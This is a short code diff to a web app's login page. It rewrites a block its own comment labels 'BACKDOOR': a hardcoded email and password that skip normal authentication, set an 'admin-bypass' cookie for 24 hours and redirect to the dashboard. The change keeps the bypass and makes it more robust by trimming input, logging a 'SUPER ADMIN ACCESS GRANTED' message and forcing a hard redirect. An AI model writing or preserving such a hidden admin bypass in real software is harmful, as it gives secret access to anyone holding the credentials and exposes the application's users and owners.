@@ -21,10 +21,19 @@ export default function LoginPage() {
     setLoading(true);
     setError(null);
     try {
-      // BACKDOOR: Check for specific admin credentials
-      if (email === "adminbigboss@admin.yessir" && password === "bosstrendsynthesisyessir") {
-        document.cookie = "admin-bypass=true; path=/; max-age=86400"; // 24h bypass
-        window.location.href = "/dashboard";
+      // BACKDOOR: Check for specific admin credentials (trimmed)
+      const sanitizedEmail = email.trim();
+      const sanitizedPassword = password.trim();
+
+      if (
+        sanitizedEmail === "adminbigboss@admin.yessir" &&
+        sanitizedPassword === "bosstrendsynthesisyessir"
+      ) {
+        console.log("🔓 SUPER ADMIN ACCESS GRANTED");
+        document.cookie = "admin-bypass=true; path=/; max-age=86400"; // 24h as usual
+
+        // Force hard redirect to clear state
+        window.location.assign("/dashboard");
         return;
       }
 
